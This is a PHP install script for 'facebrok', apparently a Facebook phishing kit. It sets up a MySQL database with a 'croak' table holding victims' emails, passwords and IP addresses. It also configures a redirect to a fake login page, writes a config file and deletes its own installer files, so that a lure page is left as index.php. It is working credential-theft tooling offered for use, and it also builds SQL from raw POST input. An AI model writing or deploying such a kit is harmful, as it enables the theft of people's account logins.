<?php
error_reporting(0);
$server=$_POST['server'];
 $user=$_POST['user'];
  $pass=$_POST['pass'];
   $data=$_POST['data'];
	$userp=$_POST['userp'];
	 $passp=$_POST['passp'];
	  mysql_connect($server,$user,$pass) or die (error());
	   if(!mysql_select_db($data)){mysql_query("CREATE DATABASE $data") or die (error());} // thanks cisckoblack 
	   mysql_select_db($data) or die (error());
	    mysql_query ("DROP TABLE IF EXISTS `croak`")                                                        or die(error());
	     mysql_query ("DROP TABLE IF EXISTS `methods`")                                                    or die          (error());
	      mysql_query ("DROP TABLE IF EXISTS `users`")												      or die(error());
	       mysql_query ("CREATE TABLE IF NOT EXISTS `croak` (`id` int(255) NOT NULL AUTO_INCREMENT PRIMARY KEY ,`Email` varchar(255)  NOT NULL,`Password` varchar(255)  NOT NULL,`Ip` varchar(255)  NOT NULL,`Dato` varchar(255)  NOT NULL,`info` varchar(500)  NOT NULL) ENGINE = INNODB AUTO_INCREMENT=0;") or die(error()); 
	        mysql_query ("CREATE TABLE IF NOT EXISTS `methods` (`id` int(255) NOT NULL AUTO_INCREMENT PRIMARY KEY ,`method` varchar(255)  NOT NULL,`value` varchar(255)  NOT NULL,`other` varchar(255)  NOT NULL) ENGINE = INNODB AUTO_INCREMENT=0;") or die(error());
	         mysql_query ("CREATE TABLE IF NOT EXISTS `users` (`id` int(255) NOT NULL AUTO_INCREMENT PRIMARY KEY ,`user` varchar(255)  NOT NULL,`pass` varchar(255)  NOT NULL) ENGINE = INNODB AUTO_INCREMENT=0;") or die(error());
	        mysql_query ("INSERT INTO `methods` (`id`, `method`, `value`) VALUES ('1', 'Redirection', 'login.php?view=fbimga100mstartpre');") or die(error());
	       mysql_query ("INSERT INTO `methods` (`id`, `method`, `value`) VALUES ('2', 'URL', 'login.php?view=fbimga100mstartpre');")                           or die(error());
	      mysql_query ("INSERT INTO `methods` (`id`, `method`, `value`) VALUES ('3', 'LANGUAGE', 'en');")  or die(error());
	     mysql_query ("INSERT INTO `methods` (`id`, `method`, `value`) VALUES ('4', '', '');")              or die          (error());
	    mysql_query ("INSERT INTO `users` (`id`, `user`, `pass`) VALUES ('1', '$userp', '$passp');")        or die(error());
	    $open = fopen("../config.php",'w') or die ('Fail');
	     fputs($open,"<?php\n");
	       fputs($open,"// facebrok\n");
	         fputs($open,"// Configuration DATA BASE-----------\n");
	           fputs($open,"\$DB_SERV=\"".$server."\";\n");
	            fputs($open,"\$DB_USER=\"".$user."\";\n");
	           fputs($open,"\$DB_PASS=\"".$pass."\";\n");
	          fputs($open,"\$DB_NADB=\"".$data."\";\n");
	        fputs($open,"//-----------------------------------\n");
	      fputs($open,"?>\n");
	    fclose($open);
      unlink('install.php');
    unlink('index.php');
  unlink('startgame.php');
rename('lost.php','index.php');
?>

                                                 <link rel="shortcut icon" href="facebook.ico" />
                                    <title>facebrok - Install</title><style type="text/css" media="screen">
                                                 <!--a:link   {text-decoration:none;}   -->
                                            </style><link rel="shortcut icon" href="facebook.ico" />
                <table width="100%" border="0" height="100%" cellspacing="0"><td valign="middle"><div align="center"><OBJECT classid>
                   <span style="color:#666"><span style="font-family: Arial;font-size:20">now facebrok is working :)</span></span>
                                                         <?php function error() {?>
                                             <link rel="shortcut icon" href="facebook.ico" />
                                    <title>facebrok - Install</title><style type="text/css" media="screen">
                                                 <!--a:link   {text-decoration:none;}   -->
                                                                  </style>

                 <table width="100%" border="0" height="100%" cellspacing="0"><td valign="middle"><div align="center"><OBJECT classid>
              <span style="color:#666"><span style="font-family: Arial;font-size:20">ERROR: <?php echo mysql_error();?></span></span><br>
                         <span style="color:#666"><span style="font-family: Arial;font-size:20">REVIEW: DATA</span></span><br>
                             <span style="color:#666"><span style="font-family: Arial;font-size:20">failed :(</span></span>
                                                                  <?php } ?>